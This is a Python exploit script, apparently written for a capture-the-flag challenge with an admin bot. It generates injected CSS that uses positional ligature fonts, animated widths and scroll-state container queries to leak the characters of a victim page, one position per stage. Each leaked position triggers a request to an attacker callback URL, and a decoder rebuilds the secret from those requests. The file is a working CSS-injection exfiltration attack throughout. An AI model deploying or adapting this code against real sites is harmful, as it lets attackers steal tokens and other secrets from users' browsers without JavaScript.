#!/usr/bin/env python3
"""
Staged CSS: read many absolute character positions in ONE page load.

The admin bot spends a fixed ~125 s per application regardless of how long our
page holds it, so page dwell is free and the scarce resource is VISITS.  This
builds one @font-face per character position, all sharing a family name and
distinguished only by font-weight, and animates font-weight through the stages.
Within each stage the container width is swept through the bucket thresholds,
so one page load resolves as many positions as there are stages.
"""
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, "..", "scratch"))
import mkfont4 as m4  # noqa: E402

FS = 16
OFF = 3               # empty lead buckets, so a font-load artifact can't decode
STEP = 600
LEAD = float(os.environ.get("LEAD", "3.0"))
FRAME = float(os.environ.get("FRAME", "0.05"))
SETTLE = int(os.environ.get("SETTLE", "2"))   # frames to let a new face apply
WARM = int(os.environ.get("WARM", "1"))       # warm-up frames per face


def weight(k):
    """Distinct integer font-weights, one per stage, inside the 1..1000 range."""
    return 10 + k * 15


def build(cb, tag, sel, anchor, positions, alpha):
    """positions: absolute offsets past `anchor` to read, one stage each."""
    faces, nb, step = [], None, None
    for k, p in enumerate(positions):
        ttf, step, nb = m4.build_positional(anchor, p, alpha, off=OFF, step=STEP)
        faces.append("@font-face{font-family:S%s;src:url(%s);font-weight:%d;"
                     "font-display:block}" % (tag, m4.data_uri(ttf), weight(k)))
    upx = step * FS / 1000.0
    per = nb + 1 + SETTLE
    # Warm-up pass: step the weight through every face once with the container
    # at its widest, so each data: font is decoded and applied before it is
    # measured.  Without this the first stages read the fallback metrics.
    nwarm = len(positions) * WARM
    nfr = nwarm + len(positions) * per
    total = LEAD + FRAME * nfr
    wmax = (nb + 1.5) * upx

    def pct(t):
        return 100.0 * t / total

    segw = ["0%%,%.6f%%{width:%.3fpx}" % (pct(LEAD) - 0.0004, wmax)]
    segu = ['0%%,%.6f%%{--u:url("data:,")}' % (pct(LEAD) - 0.0004)]
    segf = ["0%%,%.6f%%{font-weight:%d}" % (pct(LEAD) - 0.0004, weight(0))]
    for k in range(len(positions)):
        for f in range(WARM):
            i = k * WARM + f
            a, b = pct(LEAD + FRAME * i), pct(LEAD + FRAME * (i + 1)) - 0.0004
            segf.append("%.6f%%,%.6f%%{font-weight:%d}" % (a, b, weight(k)))
            segw.append("%.6f%%,%.6f%%{width:%.3fpx}" % (a, b, wmax))
            segu.append('%.6f%%,%.6f%%{--u:url("data:,")}' % (a, b))
    for k in range(len(positions)):
        for f in range(per):
            i = nwarm + k * per + f
            a, b = pct(LEAD + FRAME * i), pct(LEAD + FRAME * (i + 1)) - 0.0004
            segf.append("%.6f%%,%.6f%%{font-weight:%d}" % (a, b, weight(k)))
            if f < SETTLE:             # settle: let the new face apply
                segw.append("%.6f%%,%.6f%%{width:%.3fpx}" % (a, b, wmax))
                segu.append('%.6f%%,%.6f%%{--u:url("data:,")}' % (a, b))
                continue
            j = f - SETTLE
            w = max((nb - j + 0.5) * upx, 1.5)
            segw.append("%.6f%%,%.6f%%{width:%.3fpx}" % (a, b, w))
            segu.append('%.6f%%,%.6f%%{--u:url("%s/h/%s/%d/%d")}' % (a, b, cb, tag, k, j))

    css = "".join(faces) + """
@property --u{syntax:"<image>";inherits:false;initial-value:url("data:,")}
@keyframes f%(tag)s{%(segf)s}
@keyframes w%(tag)s{%(segw)s}
@keyframes u%(tag)s{%(segu)s}
%(sel)s{display:block!important;font-family:S%(tag)s!important;font-size:%(fs)dpx!important;
line-height:%(fs)dpx!important;white-space:pre!important;overflow-x:auto!important;
overflow-y:hidden!important;height:%(h)dpx!important;
font-variant-ligatures:common-ligatures!important;font-feature-settings:"calt" 1!important;
container-type:scroll-state!important;color:transparent!important;
animation:f%(tag)s %(total).3fs steps(1,end) 1 both,w%(tag)s %(total).3fs steps(1,end) 1 both!important}
%(sel)s::after{content:""!important;display:block!important;width:1px!important;
height:1px!important;background-image:none;
animation:u%(tag)s %(total).3fs steps(1,end) 1 both!important}
@container scroll-state(scrollable: right){%(sel)s::after{background-image:var(--u)}}
""" % {"tag": tag, "segf": "".join(segf), "segw": "".join(segw), "segu": "".join(segu),
       "sel": sel, "fs": FS, "h": FS * 3, "total": total}
    return css, total, nb


def clock(cb, tag, total, n=20):
    seg = []
    for j in range(n):
        a = 100.0 * j / n
        b = 100.0 * (j + 1) / n - 0.0005
        seg.append('%.5f%%,%.5f%%{--v:url("%s/k/%s/%d")}' % (a, b, cb, tag, j))
    return """@property --v{syntax:"<image>";inherits:false;initial-value:url("data:,")}
@keyframes c%(tag)s{%(seg)s}
html{background-image:url("%(cb)s/k/%(tag)s/ready")}
body::before{content:""!important;display:block!important;width:2px!important;
height:2px!important;background-image:var(--v);
animation:c%(tag)s %(total).3fs steps(1,end) 1 both!important}
""" % {"tag": tag, "seg": "".join(seg), "cb": cb, "total": total}


def decode(hits, tag, nstages, nb, alpha):
    """hits: list of (kind, value, ts).  value for width hits is 'stage/frame'."""
    best = {}
    for kind, val, _ in hits:
        if kind != "h":
            continue
        try:
            k, j = (int(x) for x in val.split("/"))
        except ValueError:
            continue
        if k not in best or j < best[k]:
            best[k] = j
    out = []
    for k in range(nstages):
        j = best.get(k)
        if j is None:
            out.append(None)
            continue
        idx = nb - j - OFF
        out.append(alpha[idx] if 0 <= idx < len(alpha) else None)
    return out
